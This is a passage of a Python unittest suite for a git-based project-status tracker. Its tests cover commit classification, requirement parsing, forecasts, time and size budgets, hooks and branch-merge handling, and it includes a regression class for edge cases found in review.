        plan = self.plan()
        self.assertLessEqual(len(plan.focus["upkeep"]) + len(plan.focus["not_upkeep"]) + sum(len(p) for p in plan.focus["paths"].values()), 500)
        self.assertEqual(plan.focus["not_upkeep"], [])
        self.assertTrue(any("file patterns" in words for words in plan.signal_problems))

    def test_v5_a_message_cannot_ask_for_every_row_in_every_range(self):
        known = set(range(1, 3001))
        message = "rows " + ",".join(f"{a}-{a}" for a in range(100000, 300000))
        started = time.monotonic()
        self.assertEqual(focus.named_rows(message, known), set())
        self.assertLess(time.monotonic() - started, 15.0)

    def test_v5_ranges_and_numbers_are_still_read(self):
        self.assertEqual(focus.named_rows("rows 2-3, 5", {1, 2, 3, 4, 5}), {2, 3, 5})
        self.assertEqual(focus.named_rows("row 2", {1, 2}), {2})

    def test_v6_past_its_time_a_signal_stops_and_says_so(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        for day in ("2026-03-05", "2026-03-06"):
            self.commit(day, f"work on {day}", files={f"{day}.py": "1\n"})
        with unittest.mock.patch.object(focus, "MOST_SECONDS", -1):
            found = focus.data(self.plan(), today=datetime.date(2026, 3, 10))
        self.assertEqual(found["list"], [])
        self.assertTrue(found["newest_only"])
        self.assertIn("too large", focus.text(found))

    def test_v6_a_commit_of_more_files_than_anyone_means_keeps_its_lines(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "vendor it", files={f"v/{i}.py": "1\n" for i in range(5)})
        with unittest.mock.patch.object(focus, "MOST_FILES_IN_A_COMMIT", 2):
            commit = focus.read_commits(self.repo, "-1", "HEAD")[0]
        self.assertEqual((len(commit["files"]), commit["lines"]), (2, 5))

    def test_v6_a_tables_history_is_read_from_its_newest_within_a_budget(self):
        self.commit("2026-02-01", "first")
        for i, day in enumerate(("2026-02-05", "2026-02-10", "2026-02-15", "2026-02-20"), start=1):
            self.move(i, "Partial", day)
        size = len(table_text(self.rows))
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", size * 3 + 10):
            steps, born, read_from, _ = forecast.table_steps(self.plan(), datetime.date(2026, 2, 1), TODAY)
            found = self.data()
            points = chart.points(self.plan(), today=TODAY.isoformat())
        self.assertEqual((born, read_from), ("2026-02-01", "2026-02-10"))
        self.assertEqual([step[1] for step in steps], ["2026-02-15", "2026-02-20"])
        self.assertEqual(found["window_days"], (TODAY - datetime.date(2026, 2, 10)).days + 1)
        self.assertEqual(points[0]["date"], "2026-02-10")

    def test_fitting_counts_from_the_first(self):
        self.write_table()
        sha = self.commit("2026-03-01", "first")
        size = len(table_text(self.rows))
        specs = [f"{sha}:status-table.md"] * 3
        self.assertEqual(gitio.fitting(self.repo, specs, size * 2), 2)
        self.assertEqual(gitio.fitting(self.repo, specs, size - 1), 0)
        self.assertEqual(gitio.fitting(self.repo, [], 10), 0)
        self.assertEqual(gitio.fitting(self.repo, [f"{sha}:gone.md"], 10), 1)

    def test_fitting_leaves_it_to_the_reader_when_git_cannot_say(self):
        self.assertEqual(gitio.fitting(self.tmp, ["a:b", "c:d"], 10), 2)

    def test_a_table_with_more_rows_than_commits_does_not_read_them_for_each(self):
        self.named("Alpha beta", "Gamma delta")
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "alpha and beta at last", files={"a.py": "1\n"})
        self.commit("2026-03-06", "nothing like any of them", files={"b.py": "1\n"})
        found = self.judged()
        self.assertEqual((found["alpha and beta at last"]["class"], found["alpha and beta at last"]["rows"]), (focus.UNCLEAR, [1]))
        self.assertEqual(found["nothing like any of them"]["class"], focus.OFF)

    # V7: what a spec holds
    def test_v7_a_list_whose_words_wrap_keeps_its_nested_items(self):
        text = "- Reading lists\n  (see the librarian's notes)\n    - REQ-7: Import a list\n    - REQ-8: Export a list\n\nA paragraph.\n\n    - REQ-9: code under a paragraph\n"
        self.assertEqual([item.ident for item in requirements.parse(text, "spec.md")], ["REQ-7", "REQ-8"])

    def test_v7_an_id_in_any_cell_of_a_table(self):
        text = "| # | ID | Requirement |\n|---|---|---|\n| 1 | REQ-12 | In a numbered table |\n| 2 | **REQ-13** | Marked |\n| 3 | REQ-14: Its own words | high |\n| 4 | See REQ-1 | no |\n| 5 | UTF-8 | no |\n"
        self.assertEqual([(item.ident, item.words) for item in requirements.parse(text, "spec.md")],
                         [("REQ-12", "In a numbered table"), ("REQ-13", "Marked"), ("REQ-14", "Its own words")])

    # V8: where a project keeps its project files
    def test_v8_a_lock_file_in_a_folder_is_a_lock_file(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Update dependencies", files={"frontend/package-lock.json": "1\n" * 3000, "frontend/package.json": "{}\n"})
        self.commit("2026-03-06", "Upgrade libraries", files={"backend/go.sum": "1\n" * 800, "backend/go.mod": "module x\n"})
        self.commit("2026-03-07", "Service notes", files={"backend/docs/notes.txt": "1\n"})
        found = self.judged()
        for subject in ("Update dependencies", "Upgrade libraries", "Service notes"):
            self.assertEqual(found[subject]["class"], focus.UPKEEP, subject)

    def test_v8_a_project_can_still_say_it_is_not(self):
        self.write_table()
        self.write_plan(focus={"not_upkeep": ["docs/*"]})
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "The handbook", files={"docs/handbook.txt": "1\n"})
        self.assertEqual(self.judged()["The handbook"]["class"], focus.OFF)

    # V9: what a date covers
    def grouped(self):
        self.write_plan(groups=[{"id": "launch", "label": "Launch", "domains": [1]}, {"id": "later", "label": "Later", "domains": [2]}], deadline="2026-12-01")
        lines = ["### 1. Launch (3)", "", "| # | Capability | Status | Note |", "|---|---|---|---|", "| 1 | A | Not built | |", "| 2 | B | Not built | |", "| 3 | C | Not built | |", "",
                 "### 2. Later (1)", "", "| # | Capability | Status | Note |", "|---|---|---|---|", "| 4 | D | Not built | |", ""]
        table = self.repo / "status-table.md"
        table.write_text("\n".join(lines))
        self.commit("2026-01-01", "first", table=False)
        for num, day in ((1, "2026-02-05"), (2, "2026-02-10"), (3, "2026-02-15")):
            table.write_text(table.read_text().replace(f"| {num} | {'ABC'[num - 1]} | Not built | |", f"| {num} | {'ABC'[num - 1]} | Partial | started |"))
            self.commit(day, table=False)

    def test_v9_with_groups_a_date_says_it_is_of_all_of_them(self):
        self.grouped()
        found = self.data()
        self.assertTrue(forecast.headline(found).startswith("All groups: likely done"))
        self.assertIn(", all groups:", forecast._deadline_words(found))
        self.assertIn("All groups: likely done", forecast.opener_line(self.plan(), today=TODAY))

    def test_v9_a_group_asked_for_by_name_says_nothing_more(self):
        self.grouped()
        found = self.data(group="launch")
        self.assertTrue(forecast.headline(found).startswith("Likely done"))
        self.assertNotIn("all groups", forecast._deadline_words(found))

    # V10: the first commit
    def test_v10_nothing_could_have_been_on_a_plan_that_did_not_exist_yet(self):
        needs_sh(self)
        self.write_table()
        self.engine("render", "--write")
        self.assertEqual(self.engine("install-hook").returncode, 0)
        (self.repo / "app.py").write_text("1\n")
        git(self.repo, "add", "-A")
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-m", "Initial commit"],
                              env=clean_env(), capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertNotIn("off plan", done.stdout + done.stderr)
        (self.repo / "app2.py").write_text("1\n")
        git(self.repo, "add", "-A")
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-m", "Wire up the printer"],
                              env=clean_env(), capture_output=True, text=True)
        self.assertIn("off plan", done.stdout + done.stderr)

    # V11, V12: what the tool prints, it must take
    def test_v11_a_long_id_can_be_linked(self):
        self.named("Audit log")
        self.write_table()
        self.spec("- REQUIREMENT-3: Audit trail export\n")
        done = self.engine("link", "1", "REQUIREMENT-3")
        self.assertEqual(done.returncode, 0, done.stderr)
        self.assertIn("answers to REQUIREMENT-3", done.stdout)
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])

    def test_v11_a_parents_id_is_not_its_childs(self):
        self.rows = {1: ("Billing webhook", "Not built")}
        self.write_table()
        (self.repo / "status-table.md").write_text(table_text(self.rows).replace("| Not built |  |", "| Not built | AC-7.1 |"))
        self.spec("- AC-7: Parent criterion\n- AC-7.1: Child criterion\n")
        done = self.engine("link", "1", "AC-7")
        self.assertIn("answers to AC-7", done.stdout, done.stderr)
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])

    def test_v12_the_printed_add_closes_the_gap(self):
        self.named("Export to PDF")
        self.write_table()
        words = "Administrators can export the complete audit trail of every account as a signed PDF, | with a pipe"
        self.spec(f"- [ ] {words}\n")
        item = requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"][0]
        command = requirements.what_to_do(item).split("If it is not: ")[-1].split(", or if a row")[0]
        parts = shlex.split(command)
        self.assertEqual(parts[:2], ["gitdone", "add"])
        self.assertEqual(self.engine("add", *parts[2:]).returncode, 0)
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])

    # V13: advice that names a row
    def test_v13_the_hook_names_no_row_it_cannot_know(self):
        needs_sh(self)
        self.named("Alpha", "Beta")
        self.write_table()
        self.engine("render", "--write")
        self.commit("2026-03-01", "first", table=False)
        self.assertEqual(self.engine("install-hook").returncode, 0)
        (self.repo / "printer.py").write_text("1\n")
        git(self.repo, "add", "-A")
        done = subprocess.run(["git", "-c", "user.name=T", "-c", "user.email=t@example.com", "-c", "commit.gpgsign=false", "-C", str(self.repo), "commit", "-m", "Rewrite the receipt printer driver"],
                              env=clean_env(), capture_output=True, text=True)
        said = done.stdout + done.stderr
        self.assertIn("off plan", said)
        self.assertNotIn("(row 1)", said)
        self.assertNotIn("row 12", said)

    def test_v13_focus_gives_the_form_and_no_number(self):
        self.named("Alpha", "Beta")
        self.write_table()
        self.commit("2026-03-01", "first")
        self.commit("2026-03-05", "Rewrite the receipt printer driver", files={"printer.py": "1\n"})
        self.assertIn("`row <number>`", focus.text(focus.data(self.plan(), today=datetime.date(2026, 3, 10))))

    # V14: a mistake in a signal
    def test_v14_nothing_wrong_in_a_signal_changes_an_exit_code(self):
        self.write_table()
        for keys in ({"focus": {"paths": {"²": ["src/"]}}}, {"focus": {"paths": {"9" * 5000: ["src/"]}}}, {"focus": []}, {"focus": {"paths": []}}, {"focus": {"upkeep": [1]}}):
            with self.subTest(str(keys)[:60]):
                self.write_plan(**keys)
                self.assertEqual(self.engine("render", "--write").returncode, 0)
                done = self.engine("check", "--offline")
                self.assertEqual(done.returncode, 0, done.stderr + done.stdout)

    def test_a_workstream_with_an_id_nobody_could_name_is_refused_in_words(self):
        self.write_table()
        self.write_plan(workstreams=[{"id": ["a"]}])
        done = self.engine("check", "--offline")
        self.assertEqual(done.returncode, 2)
        self.assertIn("a word or a number", done.stderr + done.stdout)
        self.write_plan(order=[["a"]])
        done = self.engine("check", "--offline")
        self.assertEqual(done.returncode, 2)
        self.assertIn("names a workstream", done.stderr + done.stdout)

    def test_a_list_of_mistakes_has_an_end(self):
        self.write_table()
        self.write_plan(focus={f"key{i}": 1 for i in range(200)})
        self.assertEqual(len(self.plan().signal_problems), 11)

    # V16: which folder a plan answers for
    def plan_below(self, **keys):
        (self.repo / "docs").mkdir()
        (self.repo / "docs" / "status-table.md").write_text(table_text(self.rows))
        self.plan_path.write_text(json.dumps({"status_doc": "docs/status-table.md", "status_out": "docs/STATUS.md", "default_branch": "main", **keys}))

    def test_v16_with_no_repo_a_plan_answers_for_its_own_folder(self):
        self.plan_below()
        self.commit("2026-03-01", "tracker", table=False)
        self.commit("2026-03-05", "Rewrite the printer driver", files={"src/printer.py": "1\n"}, table=False)
        self.assertEqual(focus.data(self.plan(), today=datetime.date(2026, 3, 10))["off_plan"], 1)

    def test_v16_a_repo_below_the_plan_keeps_the_paths_from_the_plans_folder(self):
        (self.repo / "backend").mkdir()
        self.write_table()
        self.write_plan(repo="backend", focus={"paths": {"1": ["backend/auth/"]}})
        self.commit("2026-03-01", "tracker", files={"backend/keep": "1\n"})
        self.commit("2026-03-05", "Sign tokens", files={"backend/auth/x.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Sign tokens"]["class"], focus.ON)

    # V17: a plain to-do list with headings
    def test_v17_a_heading_over_a_plain_list_is_its_domain(self):
        self.plan_path.unlink()
        (self.repo / "todo.md").write_text("# Roadmap\n\n## PHASE-1: Setup\n- [ ] Install CI\n- [ ] Add linter\n\n## PHASE-2: Launch\n- [ ] Write docs\n")
        self.assertEqual(self.engine("init", "--from-checklist", "todo.md").returncode, 0)
        plan = self.plan()
        table = tables.load_clean(plan)
        self.assertEqual([(d.name, [r.name for r in d.rows]) for d in table.domains], [("PHASE-1: Setup", ["Install CI", "Add linter"]), ("PHASE-2: Launch", ["Write docs"])])
        self.assertEqual(plan.requirements, [])

    def test_v17_a_heading_with_an_id_and_nothing_under_it_is_still_a_row(self):
        self.plan_path.unlink()
        (self.repo / "spec.md").write_text("# Spec\n\n## Requirements\n\n### REQ-1: Sign in\n\nSome prose.\n\n### REQ-2: Export\n")
        self.assertEqual(self.engine("init", "--from-checklist", "spec.md").returncode, 0)
        plan = self.plan()
        table = tables.load_clean(plan)
        self.assertEqual([(d.name, [r.name for r in d.rows]) for d in table.domains], [("Requirements", ["Sign in", "Export"])])
        self.assertEqual(plan.requirements, ["spec.md"])
        self.assertEqual(requirements.coverage(plan, table)["without"], [])

    # V18: what a test on record is
    def test_v18_a_commit_from_before_the_table_named_something_else(self):
        self.named("Magic link login", "Export to PDF")
        self.commit("2026-01-05", "Fix row 1 rendering in the spreadsheet grid", files={"tests/test_grid.py": "1\n"}, table=False)
        self.commit("2026-03-01", "tracker")
        self.commit("2026-03-05", "row 2: the export", files={"pdf.py": "1\n", "tests/fixtures/sample.json": "{}\n", "tests/test_pdf.py": "1\n"})
        rows = {r["row"]: r for r in trace.rows_data(self.plan(), offline=True)}
        self.assertEqual(rows[1]["tests"], [])
        self.assertEqual(rows[1]["named_by"], [])
        self.assertEqual(rows[2]["tests"], ["tests/test_pdf.py"])

    def test_v18_the_commit_that_made_the_table_can_name_its_rows(self):
        self.named("Magic link login")
        self.commit("2026-03-01", "row 1: with its table", files={"tests/test_link.py": "1\n"})
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_link.py"])

    # V19 to V23: what the docs say
    def test_v19_the_samples_keys_are_the_keys(self):
        self.steady()
        found = self.data()
        text = (pathlib.Path(__file__).resolve().parent.parent / "docs" / "json.md").read_text()
        sample = json.loads(text.split("## `eta --json`")[1].split("```json")[1].split("```")[0])
        self.assertEqual(set(sample), set(found))

    def test_v20_prose_that_starts_with_a_marked_id_is_prose(self):
        text = "**BUG-12** was fixed in the last release.\n\n`API-2` returns JSON.\n\n**AC-6.** Six\n\n`NFR-7`: seven\n"
        self.assertEqual([item.ident for item in requirements.parse(text, "spec.md")], ["AC-6", "NFR-7"])

    def test_v22_a_row_at_the_strict_kind_leaves_nothing_whatever_it_weighs(self):
        self.write_plan(kinds=[{"name": "Live", "weight": 0.9, "evidence": "release"}, {"name": "Not built", "weight": 0.0}])
        self.rows = {n: (f"Thing {n}", "Live") for n in self.rows}
        self.commit("2026-03-01", "all of it")
        found = self.data()
        self.assertEqual((found["left"], found["state"]), (0, "done"))

    def test_v23_a_shallow_clone_gives_no_date_to_move(self):
        needs_sh(self)
        self.steady()
        clone = self.tmp / "clone"
        subprocess.run(["git", "clone", "-q", "--depth", "2", f"file://{self.repo}", str(clone)], env=clean_env(), check=True, capture_output=True)
        plan = Plan(clone / ".gitdone.json")
        self.assertIsNone(forecast.read_pace(plan, today=TODAY))
        self.assertIsNone(forecast.shift_words(plan, (1.0, 1), today=TODAY))

    # What the same reader saw and thought too small to list
    def test_a_date_that_does_not_move_is_not_said_to(self):
        self.steady()
        pace = forecast.read_pace(self.plan(), today=TODAY)
        self.assertIsNone(forecast._moved_words((3.0, 3), (3.0, 3), pace, TODAY, "Live"))

    def test_the_burndown_says_the_kind_the_plan_has(self):
        self.write_plan(kinds=[{"name": "Shipped", "weight": 1.0, "evidence": "release"}, {"name": "Partial", "weight": 0.4, "evidence": "note"}, {"name": "Not built", "weight": 0.0}])
        self.steady()
        found = self.data()
        drawn = chart.burndown(chart.points(self.plan(), today=TODAY.isoformat()), "T", found, forecast.headline(found))
        self.assertIn("on Shipped rows alone", drawn)
        self.assertNotIn("Live", drawn)

    def test_a_window_past_the_calendar_is_refused_in_words(self):
        self.steady()
        for run in (lambda: forecast.data(self.plan(), days=1000000, today=TODAY), lambda: focus.data(self.plan(), days=1000000, today=TODAY)):
            with self.assertRaises(PlanError):
                run()

    def test_a_days_the_server_cannot_read_is_said(self):
        from gitdone import mcp
        self.steady()
        self.assertTrue(mcp._call({"name": "focus", "arguments": {"project": str(self.repo), "days": "7"}}).get("isError"))
        self.assertFalse(mcp._call({"name": "focus", "arguments": {"project": str(self.repo), "days": 7}}).get("isError"))

    def test_many_workstreams_are_found_without_a_walk_for_each(self):
        self.write_table()
        count = 20000
        self.write_plan(workstreams=[{"id": f"W{i}", "name": "n", "rows": []} for i in range(count)], sections=[])
        plan = self.plan()
        started = time.monotonic()
        for ws_id in plan.order:
            plan.workstream(ws_id)
        self.assertLess(time.monotonic() - started, 5.0)
        with self.assertRaises(PlanError):
            plan.workstream("nobody")

    def test_a_summary_takes_a_name_no_encoding_can_hold(self):
        path = self.tmp / "summary.md"
        with unittest.mock.patch.dict(os.environ, {"GITHUB_STEP_SUMMARY": str(path)}):
            ci._append("GITHUB_STEP_SUMMARY", "name \udce9.md\n")
        self.assertIn("name", path.read_text())

    def test_whatever_goes_wrong_publishing_the_gate_keeps_its_word(self):
        self.write_table()
        self.engine("render", "--write")
        self.commit("2026-03-01", "first")
        plan = self.plan()
        with unittest.mock.patch.object(ci, "badge_files", side_effect=ValueError("broken")), contextlib.redirect_stdout(io.StringIO()) as out:
            ci._publish_step(plan, tables.load_clean(plan), "badges")
        self.assertIn("could not publish", out.getvalue())


class TheFourthAttack(Case):
    """What a fourth reader found in the fixes for the third: W1 to W14. Most of it the fixes had broken, so each is held to what was right before them."""

    def named(self, *names):
        self.rows = {i: (name, "Not built") for i, name in enumerate(names, 1)}

    def set_row(self, num, kind):
        self.rows[num] = (self.rows[num][0], kind)

    def found(self, **kwargs):
        return focus.data(self.plan(), days=60, today=datetime.date(2026, 3, 30), **kwargs)

    def judged(self, **kwargs):
        return {c["subject"]: c for c in self.found(**kwargs)["list"]}

    def merge_commit(self, *args, day="2026-03-10", message="Merge"):
        env = {"GIT_AUTHOR_DATE": f"{day}T12:00:00", "GIT_COMMITTER_DATE": f"{day}T12:00:00"}
        git(self.repo, "merge", "-q", "--no-ff", *args, "-m", message, env=env)

    def spec(self, text, name="spec.md"):
        (self.repo / name).write_text(text)
        self.write_plan(requirements=[name])

    # W1: past its time it answers for what it read, and it does not say there was nothing
    def four_commits(self):
        self.write_table()
        self.commit("2026-03-01", "first")
        for day in range(2, 6):
            self.commit(f"2026-03-0{day}", f"row 1: part {day}", files={f"{day}.py": "1\n"}, table=False)

    def test_w1_a_process_out_of_time_leaves_what_it_said(self):
        script = "import sys, time; print('said by then', flush=True); time.sleep(30)"
        done = gitio._run([sys.executable, "-c", script], timeout=3)
        self.assertEqual(done.code, 124)
        self.assertEqual(done.out, "")
        self.assertIn("said by then", done.partial)

    def test_w1_what_git_said_in_time_is_answered_for(self):
        self.four_commits()
        real, third = gitio.git, git(self.repo, "rev-list", "HEAD").split()[2]

        def out_of_time(repo, *args, **kwargs):
            done = real(repo, *args, **kwargs)
            if args[0] == "log" and "--numstat" in args:
                return gitio.Done(124, "", "git did not answer", partial=done.out[:done.out.rindex(third) + 45])  # in the middle of the third commit
            return done
        with unittest.mock.patch.object(gitio, "git", out_of_time):
            found = self.found()
        self.assertEqual((found["commits"], found["on_plan"]), (2, 2))
        self.assertEqual([c["subject"] for c in found["list"]], ["row 1: part 5", "row 1: part 4"])
        self.assertTrue(found["newest_only"])
        words = focus.text(found)
        self.assertIn("Only the newest part", words)
        self.assertIn("2 commits", words)

    def test_w1_with_nothing_read_it_does_not_say_there_were_no_commits(self):
        self.four_commits()
        with unittest.mock.patch.object(focus, "MOST_SECONDS", -1):
            found = self.found()
            line = focus.opener_line(self.plan(), today=datetime.date(2026, 3, 10))
        self.assertEqual(found["commits"], 0)
        self.assertTrue(found["newest_only"])
        self.assertNotIn("no commits", focus.text(found))
        self.assertIn("too large", focus.text(found))
        self.assertIn("too large", focus.counts_words(found))
        self.assertIn("too large", line)

    def test_w1_the_numbers_elsewhere_say_they_are_of_a_part(self):
        self.four_commits()
        real = focus.data
        with unittest.mock.patch.object(focus, "data", lambda *a, **k: {**real(*a, **k), "newest_only": True}):
            line = focus.opener_line(self.plan(), today=datetime.date(2026, 3, 10))
        self.assertIn("as far as it could read", line)
        self.assertIn("as far as it could read", focus.counts_words({**self.found(), "newest_only": True}))

    def test_w1_week_says_it_too(self):
        self.four_commits()
        with unittest.mock.patch.object(focus, "MOST_SECONDS", -1):
            line = history.delta(self.plan(), since="2026-03-01", today=datetime.date(2026, 3, 10))
        self.assertIn("too large", line)

    def test_w1_a_merge_it_had_no_time_for_leaves_it_and_what_is_older_unjudged(self):
        self.named("Export", "Billing")
        self.write_table()
        self.commit("2026-03-01", "first")
        git(self.repo, "checkout", "-q", "-b", "row-1-export")
        self.commit("2026-03-02", "The exporter", files={"a.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("row-1-export", day="2026-03-03", message="Merge branch 'row-1-export'")
        self.commit("2026-03-04", "row 2: newer", files={"b.py": "1\n"}, table=False)
        reading = focus._Reading(self.plan(), None, datetime.date(2026, 3, 30))
        commits = focus.read_commits(reading.repo, "HEAD", "--not", git(self.repo, "rev-list", "--max-parents=0", "HEAD"))
        reading.ends = time.monotonic() - 1
        kept, _ = focus._inherited(reading, commits)
        self.assertEqual([c["message"] for c in kept], ["row 2: newer"])
        self.assertTrue(reading.capped)

    def test_w1_a_table_it_had_no_time_for_leaves_that_commit_and_what_is_older_unjudged(self):
        self.named("Export", "Billing")
        self.write_table()
        self.commit("2026-03-01", "first")
        self.set_row(1, "Partial")
        self.commit("2026-03-02", "Moved it", files={"a.py": "1\n"})
        self.commit("2026-03-03", "row 2: newer", files={"b.py": "1\n"}, table=False)
        reading = focus._Reading(self.plan(), None, datetime.date(2026, 3, 30))
        commits = focus.read_commits(reading.repo, "HEAD", "--not", git(self.repo, "rev-list", "--max-parents=0", "HEAD"))
        reading.ends = time.monotonic() - 1
        self.assertEqual([c["message"] for c in focus._moves(reading, commits)], ["row 2: newer"])
        self.assertTrue(reading.capped)

    # W2: past its bytes it says so, and what it could not read is not called off plan
    def moving_commits(self, count=5):
        self.named(*[f"Thing {n}" for n in range(1, count + 1)])
        self.write_table()
        self.commit("2026-03-01", "first")
        for n in range(1, count + 1):
            self.set_row(n, "Partial")
            self.commit(f"2026-03-{n + 1:02d}", f"work {n}", files={"x.py": f"{n}\n"})

    def test_w2_what_it_could_not_read_is_not_off_plan(self):
        self.moving_commits()
        room = 4 * (len(table_text(self.rows)) + 20)
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", room):
            found = self.found()
        self.assertEqual(found["off_plan"], 0)
        self.assertGreater(found["on_plan"], 0)
        self.assertLess(found["commits"], 5)
        self.assertTrue(found["newest_only"])

    def test_w2_a_version_two_commits_share_is_read_once(self):
        self.moving_commits()
        room = 7 * (len(table_text(self.rows)) + 20)
        with unittest.mock.patch.object(gitio, "MOST_BYTES_OF_HISTORY", room):
            found = self.found()
        self.assertEqual((found["on_plan"], found["off_plan"], found["newest_only"]), (5, 0, False))

    # W3: wherever the plan says the code is
    def test_w3_a_repo_below_the_plan_keeps_a_commit_that_moved_its_row(self):
        self.named("Sign in", "Export")
        self.write_table()
        self.write_plan(repo="app")
        self.commit("2026-03-01", "start", files={"app/base.py": "1\n"})
        self.set_row(1, "Partial")
        self.commit("2026-03-05", "Login form", files={"app/login.py": "1\n"})
        found = self.judged()["Login form"]
        self.assertEqual((found["class"], found["because"]), (focus.ON, "it moved the row in the table"))
        self.assertIsNone(focus.last_line(self.plan()))

    def test_w3_a_repo_beside_the_plan_keeps_it_too(self):
        tracker = self.repo / "tracker"
        tracker.mkdir()
        self.plan_path.unlink()
        self.plan_path = tracker / ".gitdone.json"
        self.named("Sign in", "Export")
        (tracker / "status-table.md").write_text(table_text(self.rows))
        self.plan_path.write_text(json.dumps({"status_doc": "status-table.md", "repo": "../app", "default_branch": "main"}))
        self.commit("2026-03-01", "start", files={"app/base.py": "1\n"}, table=False)
        self.set_row(1, "Partial")
        (tracker / "status-table.md").write_text(table_text(self.rows))
        self.commit("2026-03-05", "Login form", files={"app/login.py": "1\n"}, table=False)
        self.assertEqual(self.judged()["Login form"]["class"], focus.ON)
        self.assertIsNone(focus.last_line(self.plan()))

    # W4: a table that was renamed
    def renamed(self):
        self.named("Sign in", "Export")
        self.write_table()
        self.commit("2026-03-01", "start")
        self.set_row(1, "Partial")
        self.commit("2026-03-05", "Login form", files={"src/login.py": "1\n"})
        git(self.repo, "mv", "status-table.md", "table.md")
        self.write_plan(status_doc="table.md")
        self.commit("2026-03-07", "Rename the table", table=False)

    def test_w4_a_commit_keeps_its_row_after_the_table_is_renamed(self):
        self.renamed()
        self.assertEqual(self.judged()["Login form"]["class"], focus.ON)

    def test_w4_the_rename_itself_is_the_tracker_s_business(self):
        self.renamed()
        found = self.found()
        self.assertEqual(found["off_plan"], 0)
        self.assertEqual({c["subject"]: c["class"] for c in found["list"]}["Rename the table"], focus.TRACKER)

    # W5: a table born on a branch
    def test_w5_a_table_born_on_a_branch_that_was_merged_has_that_branch_s_commits(self):
        self.named("Sign in", "Export")
        self.commit("2026-03-01", "first", files={"README.md": "hi\n"}, table=False)
        git(self.repo, "checkout", "-q", "-b", "adopt")
        self.commit("2026-03-05", "Adopt")
        self.commit("2026-03-06", "row 1: login with tests", files={"src/login.py": "1\n", "tests/test_login.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("adopt", day="2026-03-07", message="Merge adoption")
        row = trace.rows_data(self.plan(), offline=True)[0]
        self.assertEqual(row["tests"], ["tests/test_login.py"])
        self.assertEqual(len(row["named_by"]), 1)
        self.assertEqual(self.judged()["row 1: login with tests"]["class"], focus.ON)

    def test_w5_the_first_commit_is_the_first_whatever_the_clocks_say(self):
        self.write_table()
        first = self.commit("2026-03-01", "Start")
        git(self.repo, "checkout", "-q", "-b", "side")
        self.set_row(1, "Partial")
        self.commit("2026-03-01", "On the same day")
        self.set_row(2, "Partial")
        self.commit("2026-02-01", "With a clock behind")
        git(self.repo, "checkout", "-q", "main")
        self.merge_commit("side", day="2026-03-02")
        self.assertEqual(focus._began(self.plan())[0], first)
        self.assertEqual(set(self.judged()) >= {"On the same day", "With a clock behind"}, True)

    def test_w5_a_branch_forked_before_the_table_keeps_what_main_brought(self):
        self.named("Sign in", "Export")
        self.commit("2026-03-01", "first", files={"README.md": "hi\n"}, table=False)
        git(self.repo, "checkout", "-q", "-b", "feature")
        self.commit("2026-03-02", "Feature work", files={"f.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "main")
        self.commit("2026-03-05", "Adopt")
        self.commit("2026-03-06", "row 1: login with tests", files={"src/login.py": "1\n", "tests/test_login.py": "1\n"}, table=False)
        git(self.repo, "checkout", "-q", "feature")
        self.merge_commit("main", day="2026-03-07", message="Merge branch 'main' into feature")
        self.assertEqual(trace.rows_data(self.plan(), offline=True)[0]["tests"], ["tests/test_login.py"])

    # W6: what a table in a spec says
    def parsed(self, text):
        return [(item.ident, item.words) for item in requirements.parse(text, "spec.md")]

    def test_w6_the_heading_says_where_the_id_and_its_words_are(self):
        self.assertEqual(self.parsed("| Title | ID | Priority |\n|---|---|---|\n| Sign in | REQ-1 | High |\n| Export | REQ-2 | High |\n"), [("REQ-1", "Sign in"), ("REQ-2", "Export")])
        self.assertEqual(self.parsed("| Priority | Req ID | Requirement |\n|---|---|---|\n| High | REQ-1 | Sign in |\n"), [("REQ-1", "Sign in")])

    def test_w6_an_id_in_the_last_column_keeps_the_words_before_it(self):
        self.assertEqual(self.parsed("| Title | ID |\n|---|---|\n| Sign in | REQ-1 |\n"), [("REQ-1", "Sign in")])
        self.assertEqual(self.parsed("| Thing | Ref |\n|---|---|\n| Sign in | REQ-1 |\n"), [("REQ-1", "Sign in")])

    def test_w6_the_first_column_needs_no_heading(self):
        self.assertEqual(self.parsed("| Thing | Words |\n|---|---|\n| REQ-1 | Sign in |\n| REQ-2: Export | High |\n"), [("REQ-1", "Sign in"), ("REQ-2", "Export")])
        self.assertEqual(self.parsed("| REQ-1 | Sign in |\n"), [("REQ-1", "Sign in")])

    def test_w6_an_id_alone_elsewhere_may_only_refer_to_it(self):
        self.named("Sign in", "Export")
        self.write_table()
        self.spec("| Area | Depends on |\n|---|---|\n| Billing | REQ-2 |\n\n- REQ-1: Sign in\n- REQ-2: Export\n")
        self.assertEqual(requirements.coverage(self.plan(), tables.load_clean(self.plan()))["without"], [])

    def test_w6_prose_in_a_cell_is_prose(self):
        self.assertEqual(self.parsed("| Feature | Status |\n|---|---|\n| Export | REQ-3 was dropped in v2 |\n"), [])

    def test_w6_what_a_list_says_outranks_what_a_table_says_of_it(self):
        self.named("Sign in", "Export")
        self.write_table()
        self.spec("| Area | Ref |\n|---|---|\n| Billing | REQ-2 |\n\n- REQ-1: Sign in\n- REQ-2: Export\n")
        found = requirements.coverage(self.plan(), tables.load_clean(self.plan()))
        self.assertEqual(found["without"], [])
